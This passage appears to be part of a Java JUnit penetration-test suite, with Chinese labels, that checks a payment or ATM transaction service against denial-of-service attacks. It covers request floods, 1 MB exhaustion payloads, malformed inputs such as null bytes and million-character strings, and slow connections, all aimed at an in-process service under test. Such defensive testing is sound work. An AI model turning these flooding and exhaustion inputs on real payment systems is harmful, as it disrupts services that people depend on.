                                .stan(String.format("%06d", requestId))
                                .rrn(String.format("666666%06d", requestId))
                                .build();

                        TransactionResponse response = transactionService.process(request);

                        if (response.isApproved()) {
                            successCount.incrementAndGet();
                        } else if ("429".equals(response.getResponseCode()) ||
                                   "906".equals(response.getResponseCode())) {
                            throttledCount.incrementAndGet();
                        }
                    } catch (Exception e) {
                        if (e.getMessage() != null &&
                            (e.getMessage().contains("rate limit") ||
                             e.getMessage().contains("throttle"))) {
                            throttledCount.incrementAndGet();
                        }
                    } finally {
                        latch.countDown();
                    }
                });
            }

            try {
                latch.await(timeWindowSeconds + 5, TimeUnit.SECONDS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            executor.shutdown();
            long duration = System.currentTimeMillis() - startTime;

            System.out.println("\nDoS 攻擊測試結果:");
            System.out.println("  - 總請求數: " + requestCount);
            System.out.println("  - 成功處理: " + successCount.get());
            System.out.println("  - 被限流: " + throttledCount.get());
            System.out.println("  - 執行時間: " + duration + " ms");
            System.out.println("  - 平均 TPS: " + (requestCount * 1000 / duration));

            if (throttledCount.get() > 0) {
                System.out.println("  [安全機制] 偵測到流量限制機制");
            } else {
                System.out.println("  [安全警告] 未偵測到流量限制");
            }
        }

        @Test
        @DisplayName("6.2 資源耗盡測試")
        void testResourceExhaustionAttack() {
            System.out.println("\n=== DoS 防護：資源耗盡攻擊 ===");

            // 測試大量記憶體消耗
            System.out.println("測試大型 Payload 攻擊...");
            int largePayloadSize = 1024 * 1024; // 1 MB
            String largePayload = "X".repeat(largePayloadSize);

            long startMemory = Runtime.getRuntime().totalMemory() -
                               Runtime.getRuntime().freeMemory();

            for (int i = 0; i < 10; i++) {
                System.out.println("發送大型 Payload #" + (i + 1));

                TransactionRequest request = createBaseRequest()
                        .transactionId("EXHAUST-" + System.currentTimeMillis() + "-" + i)
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .additionalData(largePayload)
                        .build();

                assertDoesNotThrow(() -> {
                    try {
                        TransactionResponse response = transactionService.process(request);
                        assertNotNull(response);
                    } catch (Exception e) {
                        System.out.println("  請求被拒絕: " + e.getClass().getSimpleName());
                    }
                });
            }

            long endMemory = Runtime.getRuntime().totalMemory() -
                             Runtime.getRuntime().freeMemory();
            long memoryUsed = (endMemory - startMemory) / (1024 * 1024); // MB

            System.out.println("記憶體使用增量: " + memoryUsed + " MB");

            if (memoryUsed > 100) {
                System.out.println("  [安全警告] 記憶體消耗過大，可能存在記憶體洩漏");
            } else {
                System.out.println("  [安全機制] 記憶體使用正常");
            }
        }

        @Test
        @DisplayName("6.3 異常封包測試")
        void testMalformedPacketAttack() {
            System.out.println("\n=== DoS 防護：異常封包攻擊 ===");

            // 測試各種異常格式
            String[] malformedData = {
                null,
                "",
                " ",
                "\n\n\n\n\n",
                "\u0000\u0000\u0000",
                "A".repeat(1000000), // 1M characters
                new String(new byte[1024]), // Binary null bytes
                "\uFFFF\uFFFF\uFFFF"
            };

            for (int i = 0; i < malformedData.length; i++) {
                String data = malformedData[i];
                System.out.println("測試異常封包 #" + (i + 1));

                TransactionRequest request = createBaseRequest()
                        .transactionType(TransactionType.BALANCE_INQUIRY)
                        .additionalData(data)
                        .build();

                assertDoesNotThrow(() -> {
                    try {
                        TransactionResponse response = transactionService.process(request);
                        assertNotNull(response);
                        System.out.println("  處理: " + response.getResponseCode());
                    } catch (Exception e) {
                        System.out.println("  拒絕: " + e.getClass().getSimpleName());
                    }
                }, "異常封包不應導致系統崩潰");
            }
        }

        @Test
        @DisplayName("6.4 慢速攻擊測試")
        void testSlowlorisAttack() {
            System.out.println("\n=== DoS 防護：慢速攻擊 ===");

            int connectionCount = 20;
            List<CompletableFuture<Void>> futures = new ArrayList<>();

            System.out.println("建立 " + connectionCount + " 個慢速連線...");

            for (int i = 0; i < connectionCount; i++) {
                final int connId = i;

                CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                    System.out.println("  慢速連線 #" + connId + " 開始");

                    TransactionRequest request = createBaseRequest()
                            .transactionId("SLOW-" + System.currentTimeMillis() + "-" + connId)
                            .transactionType(TransactionType.BALANCE_INQUIRY)
                            .build();

                    // 模擬慢速處理
                    try {
                        Thread.sleep(2000); // 2 秒延遲
                        TransactionResponse response = transactionService.process(request);
                        System.out.println("  慢速連線 #" + connId + " 完成: " +
                                         response.getResponseCode());
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        System.out.println("  慢速連線 #" + connId + " 被中斷");
                    } catch (Exception e) {
                        System.out.println("  慢速連線 #" + connId + " 錯誤: " +
                                         e.getClass().getSimpleName());
                    }
                });

                futures.add(future);
            }

            // 等待所有慢速連線完成或逾時
            try {
                CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]))
                        .get(10, TimeUnit.SECONDS);
                System.out.println("所有慢速連線已完成");
            } catch (TimeoutException e) {
                System.out.println("  [安全機制] 慢速連線被逾時控制");
            } catch (Exception e) {
                System.out.println("  慢速攻擊處理異常: " + e.getClass().getSimpleName());
            }
        }
    }

    // ==================== Helper Methods ====================

    private TransactionRequest.TransactionRequestBuilder createBaseRequest() {
        return TransactionRequest.builder()
                .transactionId("PEN-TEST-" + System.currentTimeMillis())
                .pan("4111111111111111")
                .sourceAccount("12345678901234")
                .currencyCode("901")
                .terminalId("ATM00001")
                .acquiringBankCode("004")
                .stan("999999")
                .rrn("999999999999")
                .pinBlock("1234567890ABCDEF")
                .channel("ATM")
                .processingCode("310000")
                .expirationDate("2512");
    }
}
